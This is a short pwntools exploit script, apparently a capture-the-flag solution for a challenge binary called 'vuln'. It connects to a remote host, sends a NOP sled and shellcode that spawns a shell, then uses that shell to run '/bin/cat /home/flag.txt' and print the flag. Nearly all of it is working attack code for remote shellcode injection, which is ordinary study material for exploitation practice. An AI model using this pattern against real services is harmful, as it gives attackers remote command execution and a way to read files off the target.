#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./vuln", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("34.125.199.248", 1234)

payload = b""
payload += b"\x90" * 128
payload += asm(shellcraft.sh())
p.sendline(payload)

p.readline()

p.clean()

p.sendline(b"/bin/cat /home/flag.txt")

log.success(p.readline().decode()) # OSCTF{u_r_b3rry_mischievous_xD}
